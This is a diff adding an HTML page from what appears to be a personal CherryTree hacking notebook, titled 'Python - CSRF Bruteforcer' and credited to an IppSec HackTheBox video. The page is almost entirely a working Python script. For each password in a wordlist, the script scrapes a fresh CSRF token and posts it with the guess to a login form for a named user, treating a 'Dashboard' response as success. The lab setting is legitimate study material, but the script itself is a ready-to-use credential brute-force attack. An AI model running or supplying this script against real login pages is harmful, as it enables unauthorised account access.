@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>CSRF Bruteforcer</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1>#Python - CSRF Bruteforcer</h1></strong><br />How to bruteforce login forms that use a CSRF token which changes on every attempt.<br />Taken from IppSec&#39;s hackthebox Sense video - <a href="https://youtu.be/d2nVDoVr0jE?t=2520">https://youtu.be/d2nVDoVr0jE?t=2520</a><br /><br /><div class="codebox"><div class="codebox">import&nbsp;requests<br />from&nbsp;requests.packages.urllib3.exceptions&nbsp;import&nbsp;InsecureRequestWarning&nbsp;#&nbsp;handle&nbsp;SSL&nbsp;errors<br />import&nbsp;re<br /><br />re_csrf&nbsp;=&nbsp;&#39;csrfMagicToken&nbsp;=&nbsp;&quot;(.*?)&quot;&#39;<br /><br />s&nbsp;=&nbsp;requests.session()<br />#requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br /><br />lines&nbsp;=&nbsp;open(&#39;passwords.txt&#39;)<br />for&nbsp;password&nbsp;in&nbsp;lines:<br />&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;s.post(&#39;http://127.0.0.1/index.php&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;csrf&nbsp;=&nbsp;re.findall(re_csrf,&nbsp;r.text)[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;login&nbsp;=&nbsp;{&nbsp;&#39;__csrf_magic&#39;:&nbsp;csrf,&nbsp;&#39;usernamefld&#39;:&nbsp;&#39;rohit&#39;,&nbsp;&#39;passwordfld&#39;:&nbsp;password[:-1],&nbsp;&#39;login&#39;:&nbsp;&#39;Login&#39;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;s.post(&#39;http://127.0.0.1/index.php&#39;,&nbsp;data=login)<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;Dashboard&quot;&nbsp;in&nbsp;r.text:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Valid&nbsp;login&nbsp;%s:%s&quot;&nbsp;%(&quot;rohit&quot;,&nbsp;password[:-1]))<br />&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Failed&nbsp;%s:%s&quot;&nbsp;%(&quot;rohit&quot;,&nbsp;password[:-1]))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.cookies.clear<span style="color:#000000;font-weight:400">()</span></div></div></div>
+</body>
+</html>
